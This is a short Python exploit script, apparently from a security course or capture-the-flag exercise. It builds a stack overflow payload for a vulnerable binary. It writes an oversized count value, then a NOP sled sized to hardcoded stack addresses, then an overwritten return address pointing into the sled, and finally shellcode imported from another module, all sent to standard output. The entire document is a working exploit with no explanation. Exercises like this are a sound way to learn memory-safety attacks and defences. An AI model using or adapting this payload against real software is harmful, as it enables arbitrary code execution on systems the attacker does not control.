#!/usr/bin/env python3
import sys
from struct import pack
from shellcode import shellcode

count    = 0xffffffff
ebp      = 0xfffef5ac
ret_addr = ebp + 4
buf_addr = 0xfffef5a0

offset = ret_addr - buf_addr

sled       = b"\x90" * offset
ret_target = buf_addr + offset + 4

payload  = pack("<I", count)
payload += sled
payload += pack("<I", ret_target)
payload += shellcode


sys.stdout.buffer.write(payload)

